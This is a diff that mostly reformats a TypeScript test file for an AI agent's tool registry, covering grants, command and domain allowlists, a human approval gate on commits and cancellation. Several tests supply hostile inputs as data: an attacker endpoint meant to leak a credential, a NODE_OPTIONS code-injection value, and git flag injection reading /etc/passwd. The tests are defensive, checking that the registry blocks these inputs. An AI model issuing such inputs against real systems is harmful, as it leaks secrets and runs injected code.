@@ -37,7 +37,12 @@ function stubHost(overrides?: Partial<ToolHost>): ToolHost {
   return {
     fs: {
       readFile: (path) =>
-        Promise.resolve({ content: `body:${path}`, mimeType: 'text/plain', sizeBytes: 4, lastModified: 't' }),
+        Promise.resolve({
+          content: `body:${path}`,
+          mimeType: 'text/plain',
+          sizeBytes: 4,
+          lastModified: 't',
+        }),
       writeFile: (path, data) => Promise.resolve({ path, bytesWritten: data.length }),
       listDirectory: () => Promise.resolve({ entries: [] }),
     },
@@ -99,7 +104,12 @@ function registry(host: ToolHost = stubHost()): ReturnType<typeof createToolRegi
 describe('ToolRegistry — happy path and outcome shape', () => {
   it('dispatches read_file and returns mapped output + untrusted result + sanitized events', async () => {
     const out = await registry().dispatch(call('read_file', { path: 'a.txt' }), ctx());
-    expect(out.output).toEqual({ content: 'body:a.txt', mimeType: 'text/plain', sizeBytes: 4, lastModified: 't' });
+    expect(out.output).toEqual({
+      content: 'body:a.txt',
+      mimeType: 'text/plain',
+      sizeBytes: 4,
+      lastModified: 't',
+    });
     expect(isUntrusted(out.toolResult)).toBe(true);
     const part = unwrapUntrusted(out.toolResult);
     expect(part.type).toBe('tool_result');
@@ -123,7 +133,9 @@ describe('ToolRegistry — happy path and outcome shape', () => {
     if (dup === undefined) {
       throw new Error('no built-in tools');
     }
-    expect(() => createToolRegistry({ tools: [dup, dup], host: stubHost() })).toThrow(/duplicate tool id/);
+    expect(() => createToolRegistry({ tools: [dup, dup], host: stubHost() })).toThrow(
+      /duplicate tool id/,
+    );
   });
 });
 
@@ -139,7 +151,10 @@ describe('ToolRegistry — resolution and grant', () => {
 
   it('refuses a registered-but-not-granted tool (registered ≠ authorized)', async () => {
     const err = await rejectsWith<ToolPolicyError>(
-      registry().dispatch(call('write_file', { path: 'x', content: 'y' }), ctx({ grantedToolIds: new Set(['read_file']) })),
+      registry().dispatch(
+        call('write_file', { path: 'x', content: 'y' }),
+        ctx({ grantedToolIds: new Set(['read_file']) }),
+      ),
     );
     expect(err).toBeInstanceOf(ToolPolicyError);
     expect(err.reason).toBe('not_granted');
@@ -159,7 +174,9 @@ describe('ToolRegistry — resolution and grant', () => {
 
 describe('ToolRegistry — argument validation and secret taint', () => {
   it('rejects effective args that fail the validator, naming the field (not the value)', async () => {
-    const err = await rejectsWith<ToolArgsInvalidError>(registry().dispatch(call('read_file', {}), ctx()));
+    const err = await rejectsWith<ToolArgsInvalidError>(
+      registry().dispatch(call('read_file', {}), ctx()),
+    );
     expect(err).toBeInstanceOf(ToolArgsInvalidError);
     expect(err.runErrorCode).toBe('validation');
     expect(err.fields).toContain('path');
@@ -167,7 +184,10 @@ describe('ToolRegistry — argument validation and secret taint', () => {
 
   it('rejects a secret-tainted value flowing into a tool argument (ADR-0029(c), effective set)', async () => {
     const err = await rejectsWith<ToolArgsInvalidError>(
-      registry().dispatch(call('read_file', { path: 'a' }), ctx({ secretArgKeys: new Set(['path']) })),
+      registry().dispatch(
+        call('read_file', { path: 'a' }),
+        ctx({ secretArgKeys: new Set(['path']) }),
+      ),
     );
     expect(err).toBeInstanceOf(ToolArgsInvalidError);
     expect(err.fields).toEqual(['path']);
@@ -193,10 +213,18 @@ describe('ToolRegistry — guardrails run on the EFFECTIVE args (no tool-node by
   });
 
   it('allows an input_mapping-derived command that IS on the allowlist', async () => {
-    const spawn = vi.fn(() => Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }));
-    const out = await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ process: { spawn } }) }).dispatch(
+    const spawn = vi.fn(() =>
+      Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }),
+    );
+    const out = await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ process: { spawn } }),
+    }).dispatch(
       call('run_command'),
-      ctx({ config: { inputMapping: { command: 'ls', args: ['-la'] } }, toolPolicy: { allowedCommands: ['ls -la'] } }),
+      ctx({
+        config: { inputMapping: { command: 'ls', args: ['-la'] } },
+        toolPolicy: { allowedCommands: ['ls -la'] },
+      }),
     );
     expect(out.events.result.success).toBe(true);
     expect(spawn).toHaveBeenCalledOnce();
@@ -210,7 +238,9 @@ describe('ToolRegistry — run_command allowlist', () => {
     registry().dispatch(call('run_command', args), ctx({ toolPolicy: policy }));
 
   it('matches EXACTLY — `npm` is not authorized by `npm test`', async () => {
-    const err = await rejectsWith<ToolPolicyError>(run({ command: 'npm' }, { allowedCommands: ['npm test'] }));
+    const err = await rejectsWith<ToolPolicyError>(
+      run({ command: 'npm' }, { allowedCommands: ['npm test'] }),
+    );
     expect(err.reason).toBe('command_not_allowed');
   });
 
@@ -220,7 +250,10 @@ describe('ToolRegistry — run_command allowlist', () => {
   });
 
   it('allows an opt-in glob match', async () => {
-    const out = await run({ command: 'npm', args: ['run', 'build'] }, { allowedCommandGlobs: ['npm *'] });
+    const out = await run(
+      { command: 'npm', args: ['run', 'build'] },
+      { allowedCommandGlobs: ['npm *'] },
+    );
     expect((out as { events: { result: { success: boolean } } }).events.result.success).toBe(true);
   });
 
@@ -230,7 +263,10 @@ describe('ToolRegistry — run_command allowlist', () => {
   });
 
   it('skips the allowlist for a pre-approved git_status (no policy target)', async () => {
-    const out = await registry().dispatch(call('git_status', { command: 'status' }), ctx({ toolPolicy: {} }));
+    const out = await registry().dispatch(
+      call('git_status', { command: 'status' }),
+      ctx({ toolPolicy: {} }),
+    );
     expect(out.events.result.success).toBe(true);
   });
 });
@@ -247,7 +283,9 @@ describe('ToolRegistry — http_request egress policy', () => {
   });
 
   it('rejects a non-HTTPS URL', async () => {
-    const err = await rejectsWith<ToolPolicyError>(http('http://api.example.com', { allowedDomains: ['api.example.com'] }));
+    const err = await rejectsWith<ToolPolicyError>(
+      http('http://api.example.com', { allowedDomains: ['api.example.com'] }),
+    );
     expect(err.reason).toBe('insecure_url');
   });
 
@@ -259,7 +297,9 @@ describe('ToolRegistry — http_request egress policy', () => {
   });
 
   it('rejects a host not on the allowlist', async () => {
-    const err = await rejectsWith<ToolPolicyError>(http('https://evil.example.org/x', { allowedDomains: ['api.example.com'] }));
+    const err = await rejectsWith<ToolPolicyError>(
+      http('https://evil.example.org/x', { allowedDomains: ['api.example.com'] }),
+    );
     expect(err.reason).toBe('domain_not_allowed');
   });
 
@@ -269,7 +309,9 @@ describe('ToolRegistry — http_request egress policy', () => {
   });
 
   it('strips a port before matching the FQDN', async () => {
-    const out = await http('https://api.example.com:8443/x', { allowedDomains: ['api.example.com'] });
+    const out = await http('https://api.example.com:8443/x', {
+      allowedDomains: ['api.example.com'],
+    });
     expect((out as { events: { result: { success: boolean } } }).events.result.success).toBe(true);
   });
 });
@@ -285,7 +327,10 @@ describe('ToolRegistry — git_commit human-gate', () => {
   });
 
   it('allows git_commit once a gate approval is present', async () => {
-    const out = await registry().dispatch(call('git_commit', { message: 'x' }), ctx({ gateApproved: true }));
+    const out = await registry().dispatch(
+      call('git_commit', { message: 'x' }),
+      ctx({ gateApproved: true }),
+    );
     expect(out.events.result.success).toBe(true);
   });
 });
@@ -294,30 +339,49 @@ describe('ToolRegistry — git_commit human-gate', () => {
 
 describe('ToolRegistry — config-only params and I/O mapping', () => {
   it('merges config-only values last (a model arg cannot override) and strips them from events', async () => {
-    const spawn = vi.fn(() => Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }));
-    const out = await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ process: { spawn } }) }).dispatch(
+    const spawn = vi.fn(() =>
+      Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }),
+    );
+    const out = await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ process: { spawn } }),
+    }).dispatch(
       call('run_command', { command: 'ls', cwd: '/evil' }),
       ctx({ config: { parameters: { cwd: '/safe' } }, toolPolicy: { allowedCommands: ['ls'] } }),
     );
-    expect(spawn).toHaveBeenCalledWith('ls', [], {}, { cwd: '/safe', timeoutMs: undefined }, undefined);
+    expect(spawn).toHaveBeenCalledWith(
+      'ls',
+      [],
+      {},
+      { cwd: '/safe', timeoutMs: undefined },
+      undefined,
+    );
     expect(out.events.call.toolInput).not.toHaveProperty('cwd'); // config-only stripped from the event
   });
 
   it('applies output_mapping to the FULL result', async () => {
     const out = await registry().dispatch(
       call('run_command', { command: 'ls' }),
-      ctx({ config: { outputMapping: { code: 'exitCode', text: 'stdout' } }, toolPolicy: { allowedCommands: ['ls'] } }),
+      ctx({
+        config: { outputMapping: { code: 'exitCode', text: 'stdout' } },
+        toolPolicy: { allowedCommands: ['ls'] },
+      }),
     );
     expect(out.output).toEqual({ code: 0, text: 'ok' });
   });
 
   it('web_search uses the config-pinned endpoint + credentialRef (never the raw key in args/events)', async () => {
-    const fetch = vi.fn<(req: EgressRequest, signal?: AbortSignalLike) => Promise<EgressResponse>>(() =>
-      Promise.resolve({ status: 200, headers: {}, body: '[]' }),
+    const fetch = vi.fn<(req: EgressRequest, signal?: AbortSignalLike) => Promise<EgressResponse>>(
+      () => Promise.resolve({ status: 200, headers: {}, body: '[]' }),
     );
-    const out = await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ egress: { fetch } }) }).dispatch(
+    const out = await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ egress: { fetch } }),
+    }).dispatch(
       call('web_search', { query: 'hello world' }),
-      ctx({ config: { parameters: { endpoint: 'https://search.example', credentialRef: 'ref-1' } } }),
+      ctx({
+        config: { parameters: { endpoint: 'https://search.example', credentialRef: 'ref-1' } },
+      }),
     );
     expect(fetch).toHaveBeenCalledOnce();
     const req = fetch.mock.calls[0]?.[0];
@@ -332,10 +396,15 @@ describe('ToolRegistry — config-only params and I/O mapping', () => {
 describe('ToolRegistry — host capability, execution, cancellation', () => {
   it('surfaces a missing capability as a typed (internal) error, not execution_failed', async () => {
     const processOnly: ToolHost = {
-      process: { spawn: () => Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 0 }) },
+      process: {
+        spawn: () => Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 0 }),
+      },
     };
     const err = await rejectsWith<ToolUnavailableError>(
-      createToolRegistry({ tools: BUILTIN_TOOLS, host: processOnly }).dispatch(call('read_file', { path: 'a' }), ctx()),
+      createToolRegistry({ tools: BUILTIN_TOOLS, host: processOnly }).dispatch(
+        call('read_file', { path: 'a' }),
+        ctx(),
+      ),
     );
     expect(err).toBeInstanceOf(ToolUnavailableError);
     expect(err.capability).toBe('fs');
@@ -345,7 +414,10 @@ describe('ToolRegistry — host capability, execution, cancellation', () => {
   it('wraps a host throw as a retryable execution error', async () => {
     const host = stubHost({ fs: fsWith(() => Promise.reject(new Error('disk gone'))) });
     const err = await rejectsWith<ToolExecutionError>(
-      createToolRegistry({ tools: BUILTIN_TOOLS, host }).dispatch(call('read_file', { path: 'a' }), ctx()),
+      createToolRegistry({ tools: BUILTIN_TOOLS, host }).dispatch(
+        call('read_file', { path: 'a' }),
+        ctx(),
+      ),
     );
     expect(err).toBeInstanceOf(ToolExecutionError);
     expect(err.runErrorCode).toBe('tool_failed');
@@ -354,7 +426,10 @@ describe('ToolRegistry — host capability, execution, cancellation', () => {
 
   it('refuses to start when the signal is already aborted', async () => {
     const err = await rejectsWith<ToolCancelledError>(
-      registry().dispatch(call('read_file', { path: 'a' }), ctx({ signal: { aborted: true } as never })),
+      registry().dispatch(
+        call('read_file', { path: 'a' }),
+        ctx({ signal: { aborted: true } as never }),
+      ),
     );
     expect(err).toBeInstanceOf(ToolCancelledError);
     expect(err.runErrorCode).toBe('cancelled');
@@ -364,7 +439,10 @@ describe('ToolRegistry — host capability, execution, cancellation', () => {
     const abortErr = Object.assign(new Error('aborted'), { name: 'AbortError' });
     const host = stubHost({ fs: fsWith(() => Promise.reject(abortErr)) });
     const err = await rejectsWith<ToolCancelledError>(
-      createToolRegistry({ tools: BUILTIN_TOOLS, host }).dispatch(call('read_file', { path: 'a' }), ctx()),
+      createToolRegistry({ tools: BUILTIN_TOOLS, host }).dispatch(
+        call('read_file', { path: 'a' }),
+        ctx(),
+      ),
     );
     expect(err).toBeInstanceOf(ToolCancelledError);
   });
@@ -376,7 +454,14 @@ describe('ToolRegistry — model-facing result bounding', () => {
   it('truncates the model-facing result while output_mapping keeps the full value', async () => {
     const big = 'z'.repeat(5000);
     const host = stubHost({
-      fs: fsWith(() => Promise.resolve({ content: big, mimeType: 'text/plain', sizeBytes: 5000, lastModified: 't' })),
+      fs: fsWith(() =>
+        Promise.resolve({
+          content: big,
+          mimeType: 'text/plain',
+          sizeBytes: 5000,
+          lastModified: 't',
+        }),
+      ),
     });
     const out = await createToolRegistry({ tools: BUILTIN_TOOLS, host }).dispatch(
       call('read_file', { path: 'a' }),
@@ -403,19 +488,27 @@ describe('ToolRegistry — os and orchestration tools', () => {
   });
 
   it('mcp_call dispatches through the mcp capability', async () => {
-    const out = await registry().dispatch(call('mcp_call', { server: 's', tool: 't', args: { a: 1 } }), ctx());
+    const out = await registry().dispatch(
+      call('mcp_call', { server: 's', tool: 't', args: { a: 1 } }),
+      ctx(),
+    );
     expect(out.output).toEqual({ ok: true });
   });
 
   it('invoke_agent delegates to ctx.invokeAgent', async () => {
     const invokeAgent = vi.fn(() => Promise.resolve({ delegated: true }));
-    const out = await registry().dispatch(call('invoke_agent', { nodeId: 'n2', input: { x: 1 } }), ctx({ invokeAgent }));
+    const out = await registry().dispatch(
+      call('invoke_agent', { nodeId: 'n2', input: { x: 1 } }),
+      ctx({ invokeAgent }),
+    );
     expect(invokeAgent).toHaveBeenCalledWith('n2', { x: 1 });
     expect(out.output).toEqual({ delegated: true });
   });
 
   it('invoke_agent without a delegate is a typed unavailable error', async () => {
-    const err = await rejectsWith<ToolUnavailableError>(registry().dispatch(call('invoke_agent', { nodeId: 'n2' }), ctx()));
+    const err = await rejectsWith<ToolUnavailableError>(
+      registry().dispatch(call('invoke_agent', { nodeId: 'n2' }), ctx()),
+    );
     expect(err).toBeInstanceOf(ToolUnavailableError);
     expect(err.capability).toBe('invokeAgent');
   });
@@ -441,7 +534,10 @@ describe('ToolRegistry — policy parsing edge cases', () => {
   it('yields undefined for an output_mapping path that misses', async () => {
     const out = await registry().dispatch(
       call('run_command', { command: 'ls' }),
-      ctx({ config: { outputMapping: { missing: 'a.b.c' } }, toolPolicy: { allowedCommands: ['ls'] } }),
+      ctx({
+        config: { outputMapping: { missing: 'a.b.c' } },
+        toolPolicy: { allowedCommands: ['ls'] },
+      }),
     );
     expect(out.output).toEqual({ missing: undefined });
   });
@@ -451,22 +547,45 @@ describe('ToolRegistry — policy parsing edge cases', () => {
 
 describe('ToolRegistry — config-only params cannot be model- or mapping-supplied (H1/M3)', () => {
   it('drops a model-supplied config-only key when config does not pin it (run_command env/cwd)', async () => {
-    const spawn = vi.fn(() => Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }));
-    await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ process: { spawn } }) }).dispatch(
-      call('run_command', { command: 'ls', cwd: '/evil', env: { NODE_OPTIONS: '--require /tmp/x.js' }, timeoutMs: 9_999_999 }),
+    const spawn = vi.fn(() =>
+      Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }),
+    );
+    await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ process: { spawn } }),
+    }).dispatch(
+      call('run_command', {
+        command: 'ls',
+        cwd: '/evil',
+        env: { NODE_OPTIONS: '--require /tmp/x.js' },
+        timeoutMs: 9_999_999,
+      }),
       ctx({ toolPolicy: { allowedCommands: ['ls'] } }), // config pins NONE of cwd/env/timeoutMs
     );
     // env/cwd/timeoutMs come ONLY from config — a model-supplied value never reaches spawn.
-    expect(spawn).toHaveBeenCalledWith('ls', [], {}, { cwd: undefined, timeoutMs: undefined }, undefined);
+    expect(spawn).toHaveBeenCalledWith(
+      'ls',
+      [],
+      {},
+      { cwd: undefined, timeoutMs: undefined },
+      undefined,
+    );
   });
 
   it('does not let the model redirect web_search to its own endpoint (no secret-exfil)', async () => {
-    const fetch = vi.fn<(req: EgressRequest, signal?: AbortSignalLike) => Promise<EgressResponse>>(() =>
-      Promise.resolve({ status: 200, headers: {}, body: '[]' }),
+    const fetch = vi.fn<(req: EgressRequest, signal?: AbortSignalLike) => Promise<EgressResponse>>(
+      () => Promise.resolve({ status: 200, headers: {}, body: '[]' }),
     );
-    await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ egress: { fetch } }) }).dispatch(
+    await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ egress: { fetch } }),
+    }).dispatch(
       // config pins the credentialRef but NOT the endpoint; the model tries to supply a malicious endpoint.
-      call('web_search', { query: 'q', endpoint: 'https://attacker.evil', credentialRef: 'STOLEN' }),
+      call('web_search', {
+        query: 'q',
+        endpoint: 'https://attacker.evil',
+        credentialRef: 'STOLEN',
+      }),
       ctx({ config: { parameters: { credentialRef: 'real-key-ref' } } }),
     );
     const req = fetch.mock.calls[0]?.[0];
@@ -475,17 +594,36 @@ describe('ToolRegistry — config-only params cannot be model- or mapping-suppli
   });
 
   it('drops a config-only key supplied via input_mapping too (M3)', async () => {
-    const spawn = vi.fn(() => Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }));
-    await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ process: { spawn } }) }).dispatch(
-      call('run_command', { command: 'ls' }),
-      ctx({ config: { inputMapping: { cwd: '/from-state' } }, toolPolicy: { allowedCommands: ['ls'] } }),
+    const spawn = vi.fn(() =>
+      Promise.resolve({ exitCode: 0, stdout: 'ok', stderr: '', durationMs: 1 }),
     );
-    expect(spawn).toHaveBeenCalledWith('ls', [], {}, { cwd: undefined, timeoutMs: undefined }, undefined);
+    await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ process: { spawn } }),
+    }).dispatch(
+      call('run_command', { command: 'ls' }),
+      ctx({
+        config: { inputMapping: { cwd: '/from-state' } },
+        toolPolicy: { allowedCommands: ['ls'] },
+      }),
+    );
+    expect(spawn).toHaveBeenCalledWith(
+      'ls',
+      [],
+      {},
+      { cwd: undefined, timeoutMs: undefined },
+      undefined,
+    );
   });
 
   it('git_status drops a model-supplied args[] (flag-injection closed) (H2)', async () => {
-    const spawn = vi.fn(() => Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 1 }));
-    await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ process: { spawn } }) }).dispatch(
+    const spawn = vi.fn(() =>
+      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 1 }),
+    );
+    await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ process: { spawn } }),
+    }).dispatch(
       call('git_status', { command: 'diff', args: ['--no-index', '--', '/etc/passwd'] }),
       ctx(),
     );
@@ -494,8 +632,13 @@ describe('ToolRegistry — config-only params cannot be model- or mapping-suppli
   });
 
   it('git_status runs author-pinned args from config', async () => {
-    const spawn = vi.fn(() => Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 1 }));
-    await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ process: { spawn } }) }).dispatch(
+    const spawn = vi.fn(() =>
+      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 1 }),
+    );
+    await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ process: { spawn } }),
+    }).dispatch(
       call('git_status', { command: 'diff' }),
       ctx({ config: { parameters: { args: ['--stat'] } } }),
     );
@@ -539,7 +682,10 @@ describe('ToolRegistry — host extraction rejects smuggling chars but allows hy
     ['tab', 'https://e\tvil/'],
   ])('rejects a %s in the authority as insecure', async (_name, url) => {
     const err = await rejectsWith<ToolPolicyError>(
-      registry().dispatch(call('http_request', { url }), ctx({ toolPolicy: { allowedDomains: ['api.example.com'] } })),
+      registry().dispatch(
+        call('http_request', { url }),
+        ctx({ toolPolicy: { allowedDomains: ['api.example.com'] } }),
+      ),
     );
     expect(err.reason).toBe('insecure_url');
   });
@@ -555,7 +701,9 @@ describe('ToolRegistry — glob, provider_executed, and mid-dispatch cancel', ()
   });
 
   it('classifies a provider-executed call with the provider_executed reason', async () => {
-    const err = await rejectsWith<ToolPolicyError>(registry().dispatch(call('read_file', { path: 'a' }, true), ctx()));
+    const err = await rejectsWith<ToolPolicyError>(
+      registry().dispatch(call('read_file', { path: 'a' }, true), ctx()),
+    );
     expect(err.reason).toBe('provider_executed');
     expect(err.runErrorCode).toBe('tool_denied');
   });
@@ -582,7 +730,10 @@ describe('ToolRegistry — glob, provider_executed, and mid-dispatch cancel', ()
     const err = await rejectsWith<ToolArgsInvalidError>(
       registry().dispatch(
         call('read_file'),
-        ctx({ config: { inputMapping: { path: '/etc/passwd' } }, secretArgKeys: new Set(['path']) }),
+        ctx({
+          config: { inputMapping: { path: '/etc/passwd' } },
+          secretArgKeys: new Set(['path']),
+        }),
       ),
     );
     expect(err).toBeInstanceOf(ToolArgsInvalidError);
@@ -598,11 +749,19 @@ describe('ToolRegistry — abort precedence after each await (M-3 line-109, H-1 
     const host = stubHost({
       fs: fsWith(() => {
         signal.aborted = true; // cancelled while in-flight, but the host RESOLVES (no throw)
-        return Promise.resolve({ content: 'ok', mimeType: 'text/plain', sizeBytes: 2, lastModified: 't' });
+        return Promise.resolve({
+          content: 'ok',
+          mimeType: 'text/plain',
+          sizeBytes: 2,
+          lastModified: 't',
+        });
       }),
     });
     const err = await rejectsWith<ToolCancelledError>(
-      createToolRegistry({ tools: BUILTIN_TOOLS, host }).dispatch(call('read_file', { path: 'a' }), ctx({ signal: signal as never })),
+      createToolRegistry({ tools: BUILTIN_TOOLS, host }).dispatch(
+        call('read_file', { path: 'a' }),
+        ctx({ signal: signal as never }),
+      ),
     );
     expect(err).toBeInstanceOf(ToolCancelledError);
   });
@@ -611,7 +770,14 @@ describe('ToolRegistry — abort precedence after each await (M-3 line-109, H-1 
     const signal = { aborted: false };
     const big = 'z'.repeat(5000);
     const host = stubHost({
-      fs: fsWith(() => Promise.resolve({ content: big, mimeType: 'text/plain', sizeBytes: 5000, lastModified: 't' })),
+      fs: fsWith(() =>
+        Promise.resolve({
+          content: big,
+          mimeType: 'text/plain',
+          sizeBytes: 5000,
+          lastModified: 't',
+        }),
+      ),
       outputStore: {
         spill: (text) => {
           signal.aborted = true; // the run is cancelled during the spill, but spill RESOLVES (no throw)
@@ -649,7 +815,10 @@ describe('ToolRegistry — globMatch is linear-time (no ReDoS) and correct (M-1)
     const evilGlob = 'a*'.repeat(20) + 'X'; // the classic ReDoS shape against a long non-match
     const start = performance.now();
     const err = await rejectsWith<ToolPolicyError>(
-      registry().dispatch(call('run_command', { command: 'a'.repeat(60) }), ctx({ toolPolicy: { allowedCommandGlobs: [evilGlob] } })),
+      registry().dispatch(
+        call('run_command', { command: 'a'.repeat(60) }),
+        ctx({ toolPolicy: { allowedCommandGlobs: [evilGlob] } }),
+      ),
     );
     expect(performance.now() - start).toBeLessThan(1000); // linear matcher returns near-instantly
     expect(err.reason).toBe('command_not_allowed');
@@ -664,7 +833,10 @@ describe('ToolRegistry — globMatch is linear-time (no ReDoS) and correct (M-1)
     ['gi?', 'gie', true],
     ['gi?', 'giff', false],
   ])('glob %s vs %s = %s', async (glob, command, allowed) => {
-    const run = registry().dispatch(call('run_command', { command }), ctx({ toolPolicy: { allowedCommandGlobs: [glob] } }));
+    const run = registry().dispatch(
+      call('run_command', { command }),
+      ctx({ toolPolicy: { allowedCommandGlobs: [glob] } }),
+    );
     if (allowed) {
       expect((await run).events.result.success).toBe(true);
     } else {
@@ -676,8 +848,13 @@ describe('ToolRegistry — globMatch is linear-time (no ReDoS) and correct (M-1)
 
 describe('ToolRegistry — remaining hardening regressions (TG-2, TG-4)', () => {
   it('git_status drops an args[] supplied via input_mapping (TG-2)', async () => {
-    const spawn = vi.fn(() => Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 1 }));
-    await createToolRegistry({ tools: BUILTIN_TOOLS, host: stubHost({ process: { spawn } }) }).dispatch(
+    const spawn = vi.fn(() =>
+      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', durationMs: 1 }),
+    );
+    await createToolRegistry({
+      tools: BUILTIN_TOOLS,
+      host: stubHost({ process: { spawn } }),
+    }).dispatch(
       call('git_status', { command: 'diff' }),
       ctx({ config: { inputMapping: { args: ['--no-index', '/etc/passwd'] } } }),
     );
